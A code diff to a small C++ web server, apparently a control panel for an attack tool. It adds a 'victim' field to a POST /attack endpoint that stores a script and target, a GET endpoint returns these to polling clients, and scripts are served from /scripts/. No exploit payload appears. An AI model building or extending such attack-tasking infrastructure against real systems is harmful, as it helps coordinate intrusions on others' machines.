@@ -9,6 +9,7 @@ namespace fs = std::filesystem;
 
 static std::string current_script;
 static std::string current_target;
+static std::string current_victim;
 static std::mutex  mtx;
 
 std::vector<std::string> list_scripts() {
@@ -29,17 +30,19 @@ int main() {
     svr.Post("/attack", [&](const Request& req, Response& res) {
         auto script = req.has_param("script") ? req.get_param_value("script") : "";
         auto target = req.has_param("target") ? req.get_param_value("target") : "";
+        auto victim = req.has_param("victim") ? req.get_param_value("victim") : "";
         {
             std::lock_guard<std::mutex> lock(mtx);
             current_script = script;
             current_target = target;
+            current_victim = victim;
         }
         res.set_content("OK", "text/plain");
     });
 
     svr.Get("/attack", [&](const Request&, Response& res) {
         std::lock_guard<std::mutex> lock(mtx);
-        res.set_content(current_script + "|" + current_target, "text/plain");
+        res.set_content(current_script + "|" + current_target + "|" + current_victim, "text/plain");
     });
 
     svr.Get(R"(/scripts/(.+))", [&](const Request& req, Response& res) {
